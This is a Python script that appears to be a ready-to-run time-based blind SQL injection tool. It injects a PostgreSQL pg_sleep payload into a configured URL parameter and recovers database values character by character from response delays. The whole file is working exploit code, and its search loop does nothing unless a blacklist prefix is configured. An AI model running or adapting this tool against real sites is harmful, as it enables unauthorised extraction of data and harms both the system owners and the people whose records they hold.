import copy
import json
import logging
import string
import time

import requests

_logger = logging.getLogger(__name__)

_CONFIG_SEARCH_CHARS = 'search_chars'
_CONFIG_DEFAULT_SEARCH_CHARS = string.ascii_uppercase + '_' + string.digits

_CONFIG_BASE_URL = "base_url"
_CONFIG_BASE_PARAMS = "base_params"
_CONFIG_HEADERS = "headers"

_CONFIG_INJECTED_PARAM_NAME = "injected_param_name"
_CONFIG_INJECTED_PARAM_VALID_VALUE = "injected_param_valid_value"

_CONFIG_SQL_PAYLOAD = "injected_sql_payload"
_CONFIG_SQL_PAYLOAD_DEFAULT = \
    '''
    ,(SELECT CASE WHEN COUNT((
    SELECT (
    SELECT CASE WHEN COUNT((
        SELECT (:INNER:)))
                <>0 THEN pg_sleep(:WAIT:) ELSE '' END)
            ))
        <>0 THEN true ELSE false END)
    '''

_CONFIG_SQL_SEARCH = 'sql_search'
_CONFIG_SQL_EXACT = 'sql_exact'

_CONFIG_EXPECTED_ERROR_CODE = "expected_error_code"
_CONFIG_DEFAULT_EXPECTED_ERROR_CODE = 200

_CONFIG_TIME_THRESHOLD = "time_threshold"
_CONFIG_BLACKLIST_PREFIX = "blacklist_prefix"


def _read_configurations():
    with open('config.json') as file:
        return json.load(file)


def _call(config, injected_value, time_threshold=0):
    base_url = config[_CONFIG_BASE_URL]
    base_params = config.get(_CONFIG_BASE_PARAMS, {})
    headers = config.get(_CONFIG_HEADERS, None)
    injected_param = config[_CONFIG_INJECTED_PARAM_NAME]
    base_params = copy.copy(base_params)

    base_params[injected_param] = injected_value
    expected_error_code = config.get(_CONFIG_EXPECTED_ERROR_CODE, _CONFIG_DEFAULT_EXPECTED_ERROR_CODE)

    _logger.debug("Performing call URL={}, PARAM={}, HEADERS={}".format(base_url, base_params, headers))

    start = time.time()
    response = requests.get(base_url, params=base_params, headers=headers)
    end = time.time()

    time_took = end - start
    _logger.debug("Time took = {}".format(time_took))

    _logger.debug("Response({}): {}".format(response.status_code, response.text))

    valid_response = response.status_code == expected_error_code
    response.close()

    if time_threshold > 0:
        valid_response = time_took > time_threshold

    return valid_response


def _sanity_call(config):
    _logger.info("Performing sanity call")
    valid_value = config.get(_CONFIG_INJECTED_PARAM_VALID_VALUE, '')
    valid_response = _call(config, valid_value)
    if not valid_response:
        raise Exception("Sanity call failed")


def _call_with_value(config, search_value, is_exact):
    valid_value = config.get(_CONFIG_INJECTED_PARAM_VALID_VALUE, '')
    time_threshold = config.get(_CONFIG_TIME_THRESHOLD, 0)

    search_value = search_value.replace('_', '\\_')
    sql_payload = config.get(_CONFIG_SQL_PAYLOAD, _CONFIG_SQL_PAYLOAD_DEFAULT)

    if is_exact:
        inner = config[_CONFIG_SQL_EXACT]
    else:
        inner = config[_CONFIG_SQL_SEARCH]

    value = valid_value + sql_payload. \
        replace(':INNER:', inner). \
        replace(':WAIT:', str(time_threshold)). \
        replace(':VAL:', search_value)
    return _call(config, value, time_threshold=time_threshold)


def _extract_data(config):
    detected_values = []
    blacklist_prefix = config.get(_CONFIG_BLACKLIST_PREFIX, None)

    search_chars = config.get(_CONFIG_SEARCH_CHARS, _CONFIG_DEFAULT_SEARCH_CHARS)

    detected_prefixes = ['']
    logging.info("Starting search...")
    while len(detected_prefixes) > 0:
        prefix = detected_prefixes.pop()
        if blacklist_prefix is not None and not prefix.upper().startswith(blacklist_prefix.upper()):
            if len(prefix) > 0:
                _logger.debug("Trying to see if {} is exact value".format(prefix))
                if _call_with_value(config, prefix, True):
                    _logger.debug("Detected value {}".format(prefix))
                    print('{}'.format(prefix), end='')
                    detected_values.append(prefix)

            for ch in search_chars:
                _logger.debug("Checking {}".format(prefix + ch))
                is_correct = _call_with_value(config, prefix + ch, False)
                if is_correct:
                    _logger.debug("Detected valid prefix {}".format(prefix + ch))
                    print('.', end='')
                    detected_prefixes.append(prefix + ch)

    return detected_values


if __name__ == '__main__':
    # noinspection PyBroadException
    try:
        logging.basicConfig(level=logging.INFO)
        _logger.info("Reading configurations")
        _config = _read_configurations()
        _logger.info("Configuration: {}".format(_config))
        _sanity_call(_config)
        data = _extract_data(_config)
        _logger.info("Detected values: {}".format(data))
    except Exception:
        _logger.exception("Error")
